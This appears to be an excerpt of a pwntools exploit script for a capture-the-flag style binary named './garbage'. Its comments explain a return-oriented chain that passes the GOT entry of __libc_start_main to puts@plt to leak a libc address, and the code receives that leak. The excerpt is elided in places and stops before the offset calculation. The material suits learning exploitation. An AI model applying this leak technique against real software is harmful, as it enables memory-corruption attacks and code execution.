...
# VARIANTE MAIN - objdump -D ./garbage | grep main 
# 403ff0 <__libc_start_main@GLIBC_2.2.5>
got_main = p64(0x403ff0)
...
# 	In other words, we can put an "argument" into the register %rdi, and that is the address to Global Offset Table (GOT) of <__libc_start_main@GLIBC_2.2.5>
...
# 5. %rsp point now to 0x401050 <puts@plt>, puts uses %rdi (the first register) as an argument, executes itself with this argument, leaks the global location of <__libc_start_main@GLIBC_2.2.5> and crashes.
# 	In other words, the "Local" PUT (0x401050) is going to take the argument in %rdi and leak this information.
...
# We leaked the address of main@GLIBC
leaked_main = io.recv()[:8].strip().ljust(8, b'\x00')
log.info(f'Leaked Address: {leaked_main.hex()}')

# The offset between main@leaked and main@glibc
